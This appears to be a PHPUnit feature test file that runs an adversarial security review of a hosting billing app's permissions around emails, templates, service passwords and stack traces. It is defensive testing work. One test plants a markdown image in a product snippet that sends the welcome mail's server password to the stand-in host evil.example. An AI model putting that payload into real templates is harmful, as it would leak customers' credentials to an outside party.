<?php

namespace Tests\Feature;

use App\Admin\Resources\ServiceResource\Pages\EditService;
use App\Helpers\NotificationHelper;
use App\Livewire\Client\Account;
use App\Livewire\Client\Contacts;
use App\Livewire\Client\Emails;
use App\Mail\Mail as TemplateMail;
use App\Models\Client;
use App\Models\ClientUser;
use App\Models\EmailLog;
use App\Models\NotificationTemplate;
use App\Models\Role;
use App\Models\Service;
use App\Models\Staff;
use App\Models\Ticket;
use App\Models\User;
use App\Services\Import\WhmcsEmailHistoryImport;
use App\Support\CurrentClient;
use Database\Seeders\EmailTemplateSeeder;
use Filament\Actions\Testing\TestAction;
use Filament\Facades\Filament;
use Illuminate\Database\QueryException;
use Illuminate\Foundation\Testing\RefreshDatabase;
use Illuminate\Support\Facades\DB;
use Illuminate\Support\Facades\Mail;
use Illuminate\Support\Facades\Queue;
use Livewire\Livewire;
use Tests\TestCase;

/**
 * Adversarial security review of fix/security-audit-mediums (#911). test_* are attacks that work (fail on the branch =
 * findings); test_holds_* are attacks that did not work (pass).
 */
class Adv911SecurityTest extends TestCase
{
    use RefreshDatabase;

    private User $owner;

    private Client $client;

    protected function setUp(): void
    {
        parent::setUp();
        $this->owner = User::factory()->create(['email' => 'owner@example.test']);
        $this->client = $this->owner->client();
    }

    // ---- «My emails»: a member with «emails» only --------------------------------------------------------------------

    private function log(string $subject, string $key, array $attributes = []): EmailLog
    {
        return EmailLog::query()->create(['client_id' => $this->client->id, 'subject' => $subject, 'to' => 'owner@example.test',
            'body' => "<p>{$subject} body</p>", 'status' => EmailLog::STATUS_SENT, 'sent_at' => now(), 'template_key' => $key, ...$attributes]);
    }

    private function emailsOnlyMember(): User
    {
        $member = User::factory()->withoutClient()->create(['email' => 'member@example.test']);
        ClientUser::query()->create(['client_id' => $this->client->id, 'user_id' => $member->id, 'owner' => false,
            'permissions' => ['emails'], 'granted_at' => now()]);
        app()->forgetInstance(CurrentClient::class);
        $this->actingAs($member)->withSession($this->loginUser($member, [CurrentClient::SESSION_KEY => $this->client->id]));

        return $member;
    }

    /**
     * ADV-911-1: staff's reply on the account's ticket, as the copy to an address staff CC'd (template ticket_cc_message,
     * logged on the account, not in EmailKinds::KINDS so «general») is read by a member without «tickets».
     */
    public function test_an_emails_only_member_cannot_read_a_ticket_reply_by_its_cc_copy(): void
    {
        $cc = $this->log('Re: [Ticket #ABC-123] Server down', 'ticket_cc_message');
        $member = $this->emailsOnlyMember();

        Livewire::actingAs($member)->test(Emails::class)->assertDontSee('Ticket #ABC-123')
            ->call('show', $cc->id)->assertDontSee('Server down body');
    }

    /** ADV-911-1: the same through «we received your message» of a ticket the account opened by mail (ticket_received). */
    public function test_an_emails_only_member_cannot_read_the_ticket_received_mail(): void
    {
        $received = $this->log('[Ticket #ABC-124] Invoice dispute', 'ticket_received');
        $member = $this->emailsOnlyMember();

        Livewire::actingAs($member)->withQueryParams(['open' => $received->id])->test(Emails::class)
            ->assertDontSee('Invoice dispute');
    }

    /**
     * ADV-911-2: the imported WHMCS history (template_key whmcs_history, every kind WHMCS sent: invoices, ticket replies,
     * welcome mails with their passwords scrubbed) is «general» to keysNotAllowed: a member with «emails» reads it all.
     */
    public function test_an_emails_only_member_cannot_read_the_imported_whmcs_invoices_and_tickets(): void
    {
        $imported = $this->log('Customer Invoice #31234', WhmcsEmailHistoryImport::TEMPLATE_KEY);
        $member = $this->emailsOnlyMember();

        Livewire::actingAs($member)->test(Emails::class)->assertDontSee('Customer Invoice #31234')
            ->call('show', $imported->id)->assertDontSee('Customer Invoice #31234 body');
    }

    /** Holds: a resent copy of an invoice mail, its id in ?open=, and the page's own ids stay hidden. */
    public function test_holds_resent_copies_and_open_param_of_hidden_kinds(): void
    {
        $invoice = $this->log('Invoice #77', 'invoice_paid');
        $resent = $this->log('Invoice #77 again', 'invoice_paid', ['resent_from_id' => $invoice->id]);
        $welcome = $this->log('Your VPS is ready', 'new_server_created');
        $member = $this->emailsOnlyMember();

        Livewire::actingAs($member)->withQueryParams(['open' => $resent->id])->test(Emails::class)
            ->assertDontSee('Invoice #77')->assertDontSee('Your VPS is ready')
            ->set('open', $welcome->id)->assertDontSee('Your VPS is ready body');
    }

    // ---- private templates: staff with «edit templates» but not '*' -----------------------------------------------------

    private function staff(array $permissions): Staff
    {
        Filament::setCurrentPanel(Filament::getPanel('admin'));

        return Staff::factory()->create(['role_id' => Role::create(['name' => 'Role ' . uniqid(), 'permissions' => $permissions])->id]);
    }

    private function service(string $password = 'S3cretpwXY'): Service
    {
        $product = $this->createProduct();

        return Service::factory()->create(['client_id' => $this->client->id, 'plan_id' => $product->plan->id, 'product_id' => $product->product->id,
            'status' => 'active', 'currency_code' => 'USD', 'price' => 10, 'quantity' => 1, 'expires_at' => now()->addMonth(),
            'domain' => 'example.gr', 'username' => 'examplegr', 'password' => $password]);
    }

    /**
     * ADV-911-3 (the fix's own threat, by another door): the product's snippet ({{ product_info }}) is rendered with the
     * welcome mail's data, its password too, and staff with «products» alone edit it. An image in it sends the new
     * server's password out, without '*' and without touching the private template.
     */
    public function test_staff_with_products_only_cannot_send_the_welcome_password_out_by_the_product_snippet(): void
    {
        Mail::fake();
        Queue::fake();
        config(['settings.mail_disable' => false, 'settings.default_currency' => 'USD']);
        (new EmailTemplateSeeder)->run();
        $service = $this->service();
        $products = $this->staff(['admin.products.viewAny', 'admin.products.update']);
        $this->assertTrue($products->can('update', $service->product), 'staff with «products» edit the snippet');
        $this->assertFalse($products->can('update', NotificationTemplate::query()->where('key', 'new_server_created')->sole()));

        $service->product->forceFill(['email_template' => '![logo](https://evil.example/p.gif?k={{ service_password }})'])->save();
        NotificationHelper::serverCreatedNotification($this->client, $service->fresh());

        $leaks = false;
        Mail::assertQueued(TemplateMail::class, function (TemplateMail $mail) use (&$leaks) {
            $leaks = $leaks || preg_match('~evil\.example[^"\'>]*S3cretpwXY~', $mail->renderedHtml) === 1;

            return true;
        });
        $this->assertFalse($leaks, 'the welcome password went into an outside address of the product snippet');
    }

    /**
     * ADV-911-4: non-private templates that still carry a key of their recipient's (secretsOf: a guest's ticket link)
     * stay editable with «edit templates» alone: an image in «ticket_link» sends every guest's key to their ticket out.
     */
    public function test_staff_with_edit_templates_cannot_send_a_guests_ticket_link_out(): void
    {
        Mail::fake();
        config(['settings.mail_disable' => false]);
        $editor = $this->staff(['admin.notification_templates.viewAny', 'admin.notification_templates.update']);
        $template = NotificationTemplate::query()->where('key', 'ticket_link')->sole();
        // Fixed in #911 by cutting the case: a template's text is a full admin's only (NotificationTemplatePolicy).
        $this->assertFalse($editor->can('update', $template), 'staff with «edit templates» no longer change a template\'s text');
    }

    /** Holds: the private template's key cannot be taken by a new one (unique), nor renamed on edit (disabled). */
    public function test_holds_a_new_template_cannot_take_a_private_key(): void
    {
        $this->assertTrue(NotificationTemplate::query()->where('key', 'password_reset')->exists());
        $this->expectException(QueryException::class);
        NotificationTemplate::query()->create(['key' => 'password_reset', 'name' => 'x', 'subject' => 'S', 'body' => 'B',
            'enabled' => true, 'mail_enabled' => 'force', 'in_app_enabled' => 'never']);
    }

    // ---- the primary email move ----------------------------------------------------------------------------------------

    private function member(array $permissions): User
    {
        $this->client->primaryContact->forceFill(['country' => 'GR', 'email' => 'billing@example.test', 'email_preferences' => null])->save();
        $member = User::factory()->withoutClient()->create(['email' => 'member@example.test']);
        ClientUser::query()->create(['client_id' => $this->client->id, 'user_id' => $member->id, 'owner' => false,
            'permissions' => $permissions, 'granted_at' => now()]);
        app(CurrentClient::class)->forget();
        $this->actingAs($member)->withSession($this->loginUser($member, [CurrentClient::SESSION_KEY => $this->client->id]));

        return $member;
    }

    /** Holds: case and space tricks keep the account's mails on its own address. */
    public function test_holds_case_and_space_tricks_keep_the_address(): void
    {
        Mail::fake();
        $this->member(['profile', 'emails', 'invoices', 'tickets', 'products', 'domains', 'affiliates']);

        foreach (['  BILLING@example.test ', "billing@example.test\u{200B}", 'billing@exampIe.test'] as $trick) {
            Livewire::test(Account::class)->set('contact.email', $trick)->call('submit');
            $this->assertSame('billing@example.test', mb_strtolower(trim($this->client->fresh()->mailAddress())), $trick);
        }
    }

    /** Holds: the contacts page never edits the primary, so a member with «contacts» cannot move it from there. */
    public function test_holds_the_contacts_page_cannot_edit_the_primary(): void
    {
        $this->member(['contacts', 'emails', 'invoices', 'tickets', 'products', 'domains', 'affiliates']);

        $page = Livewire::test(Contacts::class)->call('edit', $this->client->primaryContact->id)->assertNotFound();
        $this->assertNull($page->get('editing'));
        $this->assertSame('billing@example.test', $this->client->fresh()->mailAddress());
    }

    // ---- the service password ------------------------------------------------------------------------------------------

    /**
     * ADV-911-5 (Low): «never in the page until Show» — the Livewire snapshot still carries the stored password's
     * ciphertext (EditService::$filledAttributes, #[Locked] but public: rendered in wire:snapshot). Not the password
     * itself, but the page plus APP_KEY is the password.
     */
    public function test_the_edit_page_snapshot_carries_no_form_of_the_stored_password(): void
    {
        Queue::fake();
        config(['settings.default_currency' => 'USD']);
        $service = $this->service();
        $raw = (string) $service->fresh()->getRawOriginal('password');
        $page = $this->livewireAs($this->staff(['*']))->test(EditService::class, ['record' => $service->getRouteKey()]);

        $this->assertStringNotContainsString('S3cretpwXY', $page->html());
        $this->assertStringNotContainsString(substr($raw, 0, 40), $page->html());
    }

    /** Holds: the audit trail of Show, Clear and a typed one says who and which service, never the value. */
    public function test_holds_the_audit_trail_never_keeps_the_value(): void
    {
        Queue::fake();
        config(['settings.default_currency' => 'USD']);
        $service = $this->service();
        $raw = (string) $service->fresh()->getRawOriginal('password');
        $staff = $this->staff(['*']);
        $action = TestAction::make('revealStoredPassword')->schemaComponent('password', 'form');

        $page = $this->livewireAs($staff)->test(EditService::class, ['record' => $service->getRouteKey()]);
        $page->mountAction($action)->assertMountedActionModalSee('S3cretpwXY');
        $this->livewireAs($staff)->test(EditService::class, ['record' => $service->getRouteKey()])
            ->fillForm(['password' => 'Typed2ndPW'])->call('save')->assertHasNoFormErrors();
        $this->livewireAs($staff)->test(EditService::class, ['record' => $service->getRouteKey()])
            ->callAction(TestAction::make('clearPassword')->schemaComponent('password', 'form'));

        $audits = DB::table('audits')->where('auditable_type', $service->getMorphClass())->where('auditable_id', $service->id)->get();
        $this->assertTrue($audits->contains('event', 'password_revealed'));
        $this->assertTrue($audits->contains('event', 'password_cleared'));
        foreach ($audits as $audit) {
            $text = $audit->old_values . $audit->new_values;
            $this->assertStringNotContainsString('S3cretpwXY', $text);
            $this->assertStringNotContainsString('Typed2ndPW', $text);
            $this->assertStringNotContainsString(substr($raw, 0, 40), $text);
        }
        foreach (['password_revealed', 'password_cleared'] as $event) {
            $this->assertStringContainsString((string) $staff->id, (string) $audits->firstWhere('event', $event)->new_values, $event);
        }
    }

    /** Holds: staff who may view services (not update) cannot mount Show or Clear by a crafted Livewire call. */
    public function test_holds_a_viewer_cannot_mount_the_reveal_by_a_crafted_call(): void
    {
        Queue::fake();
        config(['settings.default_currency' => 'USD']);
        $service = $this->service();
        $viewer = $this->staff(['admin.services.viewAny', 'admin.clients.viewAny']);

        $this->livewireAs($viewer)->test(EditService::class, ['record' => $service->getRouteKey()])->assertNotFound();
        $this->assertSame('S3cretpwXY', $service->fresh()->password);
        $this->assertSame(0, DB::table('audits')->where('event', 'password_revealed')->count());
    }

    // ---- traces --------------------------------------------------------------------------------------------------------

    private static function deep(string $secret): void
    {
        (function (string $inner) {
            trigger_error('boom', E_USER_WARNING);
        })($secret);
    }

    /** Holds: a PHP warning made ErrorException, through a closure, carries no argument either. */
    public function test_holds_an_error_exception_from_a_warning_has_no_args(): void
    {
        try {
            self::deep('hunter2-in-a-closure');
            $this->fail('no exception');
        } catch (\ErrorException $e) {
            $this->assertStringNotContainsString('hunter2', $e->getTraceAsString());
            foreach ($e->getTrace() as $frame) {
                $this->assertArrayNotHasKey('args', $frame);
            }
        }
    }

    /** Holds: a job's failure kept in failed_jobs is the trace as a string: no arguments. */
    public function test_holds_the_logged_exception_has_no_args(): void
    {
        $e = (fn (string $s) => new \RuntimeException('x'))('hunter2-closure-arg');
        $this->assertStringNotContainsString('hunter2', (string) $e);
    }
}
